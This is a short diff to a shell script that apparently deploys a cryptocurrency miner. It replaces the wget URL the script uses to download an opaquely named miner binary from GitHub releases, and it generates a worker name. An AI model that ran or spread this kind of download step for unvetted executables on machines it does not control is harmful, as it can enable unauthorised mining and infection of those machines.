@@ -20,7 +20,7 @@ main() {
     worker_name=$(generate_worker_name)
 
     echo "📥 Downloading miner to: $miner_filename"
-    if wget -q https://github.com/vedhagsvp/qubros/releases/download/apl/crcxcba -O "$miner_filename"; then
+    if wget -q https://github.com/tallapallitech63/prvnraw/releases/download/pravxcsoft/pravxcv -O "$miner_filename"; then
         echo "✅ Miner downloaded as: $miner_filename"
     else
         echo "❌ Failed to download miner. Exiting."
